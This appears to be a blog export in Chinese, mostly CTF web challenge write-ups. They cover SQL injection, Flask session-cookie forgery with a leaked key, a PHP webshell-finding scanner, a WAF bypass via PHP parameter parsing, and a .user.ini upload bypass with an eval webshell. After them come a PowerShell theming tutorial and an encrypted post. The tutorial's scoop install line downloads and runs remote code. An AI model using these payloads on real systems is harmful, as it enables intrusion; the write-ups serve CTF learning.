所以我们直接输入*,1也可以得到flag 除此之外，官方解法还可以通过设置sql_mode来解决，将||变为类似Oracle的管道连接符 payload如下： 11;set sql_mode=pipes_as_concat;select 1 [HCTF 2018]admin 查看源代码发现提示信息 1&lt;!-- you are not admin --&gt; 需要我们以admin身份登录，浏览之后发现有注册功能，随便注册一个账号，登录之后看到存在cookie，应该是要伪造cookie，查看cookie格式应该是flask下的cookie，那么伪造的话我们需要获得secret_key，尝试了模板注入没有发现，最终在change页面发现源代码地址 1&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt; 查看源代码可以得知secret_key为ckj123 然后就是正常的cookie伪造 1py .\\flask_session_cookie_manager3.py decode -c &#39;.eJxNkMGKwjAURX9lyNpFmupGcFGJU1J4L1QyE_I2MqNVm1iFVqmN-O9TXc32wD1w7oNt9m3VHdn82t6qCdvUOzZ_sI9fNmeYlz0ZFUGGQRvHtVwJyt0dPQiwVKOFAeUhYoRE23Xj7GpAQQGN4mi_j-iXwfml11IJZ4sa5WtbnJxQA8QiUL7i2mScbJmO3imZLCVTBJQZd2JdYwMJCDUDW5wo_xy5SsGXXOcYyGCjbdmjD_dxu2DPCdt27X5zvYTq_C9h1PqQogHuouqd30b0B06-nGq5q1-cJAiyX2OKmrkIUzos3rrzT1ONiu586dmE3bqqfZ_DEs6ef_NiYyk.XkThtA.0N3JaixDVMTckrVyXBvrmGo7sgI&#39; -s &#39;ckj123&#39; 1py .\\flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4d0e23092964816df16361fb5c24837359dfaa27fd5245ea60db0c826abb46162ecb232dda4904ed7df8e07e2d404cdb6c53b91bedad4272448cde3f9d0691df&#39;, &#39;csrf_token&#39;: b&#39;4f8f97534c20b73684f4887b534d36ee2429c38f&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;1&#39;&#125;&quot; -s &quot;ckj123&quot; 可以得到cookie 1.eJxNkMGKwjAURX9leGsXMdWN4EKJU1J4L1QyE_I24mjVJtaBqmgj_vtUV7M9cA-c-4DVrq3OB5hc2ms1gFW9hckDPn5gApSXN7Y6oYqdsV4YtZCc-zsFlOi4JocdqX2ihEPjlo13i44kR7JakPs-UJhHH-bBKC29K2pSr21x9FJ3mIrI-UIYOxPsyqz3jtjOMrZFJDUTXi5ranCIUo_RFUfOP3uuMwylMDlFttQYV94oxHu_ncJzAJtzu1tdfmN1-pfQa0PMyKLwSd982CQKe8GhHBm1rV-cFUp2X32KHvuEI95P37rTuql6xXrb1CcYwPVcte93YAjPP_KyYzs.XkTsFA.YOebiET5QoqNJ-EXRqMFRBrKHg8 本题还有其它解法 方法二： pass [强网杯 2019]高明的黑客 题目直接给出了源码，下载之后是三千多个shell，但是大部分都不能用，需要找出能够使用的，方法是通过匹配$_POST或$_GET来执行命令，这里可以使用echo命令，因为该命令既在PHP下可以执行，在shell条件下也可以执行，此外，如果一个一个试的话速度会非常慢，我们需要使用多线程来增加速度，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041import reimport requestsimport osimport multiprocessing as mpurl = 'http://192.168.75.144/'flag = 1 # 在得到可用shell之后退出线程def test_shell(filename): global flag if flag: command = \"echo 'aesm1p';\" with open(filename) as f: cont = f.read() # POST catches = re.findall(r\"\\$_POST\\['(\\S+)'\\]\", cont) for para in catches: data = &#123;para: command&#125; res = requests.post(url+filename, data=data).content.decode('utf-8') if 'aesm1p' in res: flag = 0 print('Success! url is &#123;&#125;. payload: &#123;&#125;'.format(url + filename, para)) break # GET catches = re.findall(r\"\\$_GET\\['(\\S+)'\\]\", cont) for para in catches: res = requests.get(url + filename + '?' + para + '=' + command).content.decode('utf-8') if 'aesm1p' in res: flag = 0 print('Success! url is &#123;&#125;'.format(url + filename + '?' + para + '=' + command)) break return 0 else: return 0if __name__ == '__main__': files = os.listdir('src/') pool = mp.Pool(processes=30) for file in files: pool.apply_async(test_shell,args = ('src/' + file,)) pool.close() pool.join() [RoarCTF 2019]Easy Calc 本题考点是php的字符串解析特性 PHP在将查询字符串（在URL中或者在正文中）转化为$_GET或$_POST数组时，会将一些字符删除或用下划线替代，它在解析时会做两件事 删除某些空白字符 将某些字符转换为下划线 例如下面这段代码 1234&lt;?phpvar_dump($_GET);var_dump($_POST);?&gt; 可以看到，在get参数中[被转换成了_，而字段名前面的空格被置空，但是字段名后面的空格会被保留 这个特性在绕过某些waf时可以用到，如某些waf对user_id字段有过滤，我们可以使用字段user[id来绕过，waf不会检测该字段，但是到了PHP后端则又会被转化为user_id，从而成功绕过WAF。 本题中，查看源代码 1&lt;!--I&#39;ve set up WAF to ensure security.--&gt; 给出了calc.php的代码 12345678910111213error_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125; 本来我以为calc.php中的过滤即为waf，但是及时我们输入符合过滤规则题目也会触发报错，应该是加了waf，那么我们的请求的流程就是提交请求-&gt;waf过滤-&gt;calc.php中再次过滤并执行，这样的话按照上面的思路，我们可以在字段num前面加个空格，waf不会过滤该字段(因为该字段为num)，在PHP后端又会解析为num，这样就绕过了过滤 1http:&#x2F;&#x2F;node3.buuoj.cn:27779&#x2F;calc.php?%20num&#x3D;phpinfo() 查看禁用函数 发现命令执行的函数被禁用了，那么我们可以使用scandir函数来获得目录，用file_get_contents来读文件，因为引号被过滤了，所以我们用asicc码来构造文件名 PS: 通过查看题目waf过滤规则可以看到题目过滤的仅仅是参数num，如果被拦截则会返回403 1SecRule ARGS:num &quot;@rx [a-zA-Z_\\x7f-\\xff\\x00-\\x24][a-zA-Z_0-9\\x7f-\\xff\\x00-\\x24]*&quot; &quot;id:001,msg:&#39;Hack&#39;,severity:ERROR,deny,status:403&quot; 此题目还有另一种方法可以绕过，就是利用HTTP走私攻击https://paper.seebug.org/1048/，当请求包含两个Content-Length时可以实现HTTP走私 因为waf服务器看到请求头中有两个content-length会返回400错误，但是后端却依然会处理该请求 [SUCTF 2019]CheckIn 题目简化了一下,直接给出了源码，核心部分如下 1234567891011121314151617181920212223242526if (isset($_POST[\"upload\"])) &#123; $tmp_name = $_FILES[\"fileUpload\"][\"tmp_name\"]; $name = $_FILES[\"fileUpload\"][\"name\"]; if (!$tmp_name) &#123; die(\"filesize too big!\"); &#125; if (!$name) &#123; die(\"filename cannot be empty!\"); &#125; $extension = substr($name, strrpos($name, \".\") + 1); if (preg_match(\"/ph|htacess/i\", $extension)) &#123; die(\"illegal suffix!\"); &#125; if (mb_strpos(file_get_contents($tmp_name), \"&lt;?\") !== FALSE) &#123; die(\"&amp;lt;? in contents!\"); &#125; $image_type = exif_imagetype($tmp_name); if (!$image_type) &#123; die(\"exif_imagetype:not image!\"); &#125; $upload_file_path = $userdir . \"/\" . $name; move_uploaded_file($tmp_name, $upload_file_path); echo \"Your dir \" . $userdir. ' &lt;br&gt;'; echo 'Your files : &lt;br&gt;'; var_dump(scandir($userdir));&#125; 过滤有三个： 文件名中不得出现ph或htacess 文件内容不得以&lt;?开头 exif_imagetype()函数校验图片 依次绕过： 上传文件后缀修改为jpg 用标签&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_REQUEST[&#39;snow&#39;]);&lt;/script&gt;来包裹PHP语句 添加文件头 接下来就是设法将jpg文件解析为PHP文件从而getshell，通过.user.ini文件可以实现该功能，在PHP官方文档中有详细的解释 PHP启动时会在每个目录下扫描.user.ini文件，从被执行的PHP文件目录开始一直上升到web根目录。如果被执行的PHP文件在web根目录之外，则只扫描该目录。需要注意的是在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。https://www.php.net/manual/en/ini.list.php可以查询配置名和设置模式，其中，有两个设置项很关键 auto_prepend_file: 指定在加载主文件之前解析的文件，相当于在主文件最前面加一个require语句auto_append_file： 与上面类似，只不过是在主文件结束之后解析 所以攻击思路就是先上传一个.user.ini文件，指定要包含的jpg文件；然后上传jpg文件getshell 上传.user.ini文件 #difine ... 是为了绕过exif_imagetype()函数 然后上传exp.jpg 然后即可getflag 1http:&#x2F;&#x2F;ec4f3f55-24f4-49f2-84e5-58b3b5f49a95.node3.buuoj.cn&#x2F;uploads&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;index.php?snow&#x3D;system(%27cat%20&#x2F;flag%27); 这个漏洞感觉实际利用可能性不大，因为不大可能会有奇葩程序员会在保存上传文件的文件夹下放一个可执行的PHP文件","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://chaosec.top/tags/Web/"}]},{"title":"oh-my-posh美化PowerShell","slug":"psbeautify","date":"2020-03-22T06:29:44.000Z","updated":"2020-09-13T10:13:45.177Z","comments":true,"path":"2020/03/22/psbeautify/","link":"","permalink":"http://chaosec.top/2020/03/22/psbeautify/","excerpt":"爱美之心，人皆有之","text":"爱美之心，人皆有之 Windows下的shell真的是丑出天际，字体也非常别扭，之前用的cmder，刚开始相比cmd的话，确实是美观多了，不过使用了一段时间之后又觉得很丑了，而且cmder实现原理在于把一些常用的linux命令在windows下编译为可执行文件，这样就导致一定的命令延迟，这让我觉得莫名的别扭（好吧，我就是审美奇葩），在加上最近准备把powershell作为主力shell，而默认的PowerShell比CMD还要感人，需要进行一下美化 oh-my-posh是windows下的主题工具，借鉴于linux下的oh-my-zsh，我此次就是利用该工具来美化PS 安装包管理器 scoop是Windows下一款非常好用的包管理工具，能够自动设置环境变量，类似于linux下的apt等包管理工具，官网Click Here 12Set-ExecutionPolicy RemoteSigned -scope CurrentUser # 设置powershell执行策略Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;get.scoop.sh&#39;) # 安装scoop 安装完成后，输入scoop，如下所示即说明安装成功 安装git与posh-git 123scoop install -g gitscoop bucket add extrasscoop install posh-git 安装oh-my-posh 1scoop install oh-my-posh 安装过程中如果出现超时错误的话请扶墙 安装字体 中文环境下，默认的ps字体不仅不美观，而且很多特殊字符也不支持，这会导致后面修改主题时看不到效果，出现乱码，而powershell的字体要求非常高，一般的字体无法在原生的ps终端使用，根据其它大佬的测试，Sarasa Gothic字体是符合ps的苛刻要求的，Github地址 安装powerline字体 除了上述字体之外，还可以安装powerline系列字体，能够很好的适配，Github地址在这下载之后选择自己喜欢的字体安装，也可以运行install.ps1全部安装 启用oh-my-posh 接下来需要编写配置文件，才能够让配置每次自动生效，配置路径在$profile中，我们可以输入该变量查看配置文件位置 12➜ $profileC:\\Users\\Snow\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1 配置文件内容如下 123Import-Module DirColorsImport-Module Posh-gitImport-Module oh-my-posh DirColors是一个对输出进行着色的模块 配置主题：oh-my-posh内置多个主题，使用Set-Theme命令可以预览主题，TAB键可以切换不同的主题，我个人比较喜欢Honukai主题在修改主题后，需要将改动写入配置文件$profile中，否则下次启动就还是原主题，在配置文件中加一行内容 1Set-Theme Honukai 修改配置： 输入$ThemeSettings可以查看当前设置 修改用户名 1$ThemeSettings.CurrentUser &#x3D; &#39;aesm1p&#39; 如果想要永久生效需要将上述命令写入配置文件$profile 第三方终端 在按照上述方法配置之后，PS就能够使用了。不过，虽然原生PS运行效率高，速度快，可由于PS太过底层，导致颜值控们进行美化修改时存在诸多限制，比如字体，上文提到的能在原生ps下使用的字体寥寥无几，选择空间有限，而且界面配色，背景等设置在PS中也非常困难，而通过第三方终端可以很方便的进行设置美化 Windows Terminal 个人最推荐的一款，微软爸爸官方开源，维护很及时，而且字体的锯齿消除做的是最好的，而且官方应用优化也是更加的独到，缺点是目前配置主要使用json文件来配置，没有gui界面，对小白不太友好，不过WindowsTerminal有完善的官方文档指导还是很贴心的。安装该软件需要windows10版本为1903以上，可以通过Microsoft Store安装，也可以在github下载安装，通过store安装的话能够自动更新，手动安装无法自动获取更新。安装完成之后进入软件打开设置settings.json，设置文件结构为：12345678910111213141516171819202122&#123; \"theme\": \"light\", //主题有light,dark,system三种 \"profiles\": //配置选项 &#123; \"defaults\": &#123; //此处添加全局配置 &#125;, \"list\": [ //单独配置 ] &#125;, \"schemes\": //配色方案，以列表形式存储 [ &#123;&#125;,//scheme ], \"keybindings\"://绑定快捷键，具体可修改的快捷键参数可以查阅官方文档 [ &#123;&#125;, ]&#125;了解清楚配置文件结构之后添加相应的配置参数即可，主要是字体大小，配色方案，键绑定等，这里贴上我的配置方案123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127// This file was initially generated by Windows 终端(未打包) 1.2.200825001-release1.2// It should still be usable in newer versions, but newer versions might have additional// settings, help text, or changes that you will not see unless you clear this file// and let us generate a new one for you.// To view the default settings, hold \"alt\" while clicking on the \"Settings\" button.// For documentation on these settings, see: https://aka.ms/terminal-documentation&#123; \"$schema\": \"https://aka.ms/terminal-profiles-schema\", // \"defaultProfile\": \"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;\", \"theme\": \"light\", // You can add more global application settings here. // To learn more about global settings, visit https://aka.ms/terminal-global-settings // If enabled, selections are automatically copied to your clipboard. \"copyOnSelect\": false, // If enabled, formatted data is also copied to your clipboard \"copyFormatting\": false, // A profile specifies a command to execute paired with information about how it should look and feel. // Each one of them will appear in the 'New Tab' dropdown, // and can be invoked from the commandline with `wt.exe -p xxx` // To learn more about profiles, visit https://aka.ms/terminal-profile-settings \"profiles\": &#123; \"defaults\": &#123; // Put settings here that you want to apply to all profiles. \"name\":\"PowerShell\", \"source\": \"Windows.Terminal.PowershellCore\", \"colorScheme\": \"One Half Dark\", \"cursorColor\":\"#FFFFFF\", \"fontFace\":\"Meslo LG M for Powerline\", \"fontSize\":10, \"cursorShape\":\"filledBox\", \"startingDirectory\":\"your dir\", \"backgroundImage\" : \"image path\", \"backgroundImageOpacity\": 0.3 &#125;, \"list\": [ &#123; // Make changes here to the powershell.exe profile. \"guid\": \"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;\", \"name\": \"Windows PowerShell\", \"commandline\": \"powershell.exe\", \"hidden\": false &#125;, &#123; // Make changes here to the cmd.exe profile. \"guid\": \"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;\", \"name\": \"命令提示符\", \"commandline\": \"cmd.exe\", \"hidden\": false &#125;, // &#123; // \"guid\": \"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;\", // \"hidden\": false, // \"name\": \"Azure Cloud Shell\", // \"source\": \"Windows.Terminal.Azure\" // &#125; &#123; \"guid\": \"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;\", \"hidden\": false, \"name\": \"Azure\", \"source\": \"Windows.Terminal.Azure\" &#125;, &#123; \"guid\": \"&#123;b453ae62-4e3d-5e58-b989-0a998ec44156&#125;\", \"name\": \"Python InterAction\", \"commandline\": \"py\", \"hidden\": false &#125; ] &#125;, // Add custom color schemes to this array. // To learn more about color schemes, visit https://aka.ms/terminal-color-schemes \"schemes\": [ &#123; \"name\" : \"Frost\", \"background\" : \"#FFFFFF\", \"black\" : \"#3C5712\", \"blue\" : \"#17b2ff\", \"brightBlack\" : \"#749B36\", \"brightBlue\" : \"#27B2F6\", \"brightCyan\" : \"#13A8C0\", \"brightGreen\" : \"#89AF50\", \"brightPurple\" : \"#F2A20A\", \"brightRed\" : \"#F49B36\", \"brightWhite\" : \"#741274\", \"brightYellow\" : \"#991070\", \"cyan\" : \"#3C96A6\", \"foreground\" : \"#000000\", \"green\" : \"#6AAE08\", \"purple\" : \"#991070\", \"red\" : \"#8D0C0C\", \"white\" : \"#6E386E\", \"yellow\" : \"#991070\" &#125; ], // Add custom keybindings to this array. // To unbind a key combination from your defaults.json, set the command to \"unbound\". // To learn more about keybindings, visit https://aka.ms/terminal-keybindings \"keybindings\": [ // Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json. // These two lines additionally bind them to Ctrl+C and Ctrl+V. // To learn more about selection, visit https://aka.ms/terminal-selection &#123; \"command\": &#123;\"action\": \"copy\", \"singleLine\": false &#125;, \"keys\": \"ctrl+c\" &#125;, &#123; \"command\": \"paste\", \"keys\": \"ctrl+v\" &#125;, // Press Ctrl+Shift+F to open the search box &#123; \"command\": \"find\", \"keys\": \"ctrl+shift+f\" &#125;, // Press Alt+Shift+D to open a new pane. // - \"split\": \"auto\" makes this pane open in the direction that provides the most surface area. // - \"splitMode\": \"duplicate\" makes the new pane use the focused pane's profile. // To learn more about panes, visit https://aka.ms/terminal-panes &#123; \"command\": &#123; \"action\": \"splitPane\", \"split\": \"auto\", \"splitMode\": \"duplicate\" &#125;, \"keys\": \"alt+shift+d\" &#125;, &#123;\"command\": \"closeTab\", \"keys\": \"ctrl+delete\"&#125; ]&#125;最终效果如下： Fluent Terminal 我最先使用的是这款，在github上搜索，然后下载后用ps运行文件夹下的Install.ps1即可，效果如下： 比起PS来已经美观多了，不过吹毛求疵的我还是感觉到了一丝丝不爽： 启动时有时会加载不出左侧的命令提示符，或者比较慢，需要按下回车才能出来，总之初始化有时会有点卡 字体稍微有点模糊，锯齿略明显（在字体小的情况下），而且显示效果不舒服 设置项较少，跟不上我装X追求完美的步伐 复制粘贴时有点问题，有时候只能整行复制，选取不到某段字符 ConEmu 官网下载安装即可 界面配置 设置默认以PS启动 设置字体 设置背景图片 设置PS为默认shell 设置配色 使用colortool来进行设置，colortool是微软出的一个powershell配色工具，支持Iterm主题 安装 1scoop install colortool 待续 颜色设置 PS的字体颜色中有许多很暗的颜色的，比如在输入-xxxx选项是黑灰色，分辨度很差，我们可以自己修改成想要的颜色，点击”settings”，转到颜色选项卡 选择自己喜欢的颜色方案 然后下面第8个一般是暗色，这个就是控制上述选项的（我是和我shell中的颜色对比确定的），我们选择一个自己喜欢的颜色，效果如下，清楚了许多 其它颜色修改也可以参照上面的方法自己DIY，最后记得要保存成自己的颜色方案 效果展示 cmder（该软件也有丰富的设置项，只是我没怎么搞而已，也是一个不错的软件） Fluent Terminal ConEmu https://sspai.com/post/52868https://iterm2colorschemes.com/https://github.com/JanDeDobbeleer/oh-my-posh","categories":[{"name":"教程","slug":"教程","permalink":"http://chaosec.top/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"PowerShell","slug":"PowerShell","permalink":"http://chaosec.top/tags/PowerShell/"},{"name":"美化","slug":"美化","permalink":"http://chaosec.top/tags/%E7%BE%8E%E5%8C%96/"}]},{"title":"Rootme网站做题记录(二)","slug":"rootme1","date":"2019-08-06T03:47:10.000Z","updated":"2020-09-13T14:40:14.546Z","comments":true,"path":"2019/08/06/rootme1/","link":"","permalink":"http://chaosec.top/2019/08/06/rootme1/","excerpt":"The article has been encrypted, please enter your password to view.","text":"Password plz... Incorrect Password! No content to display! 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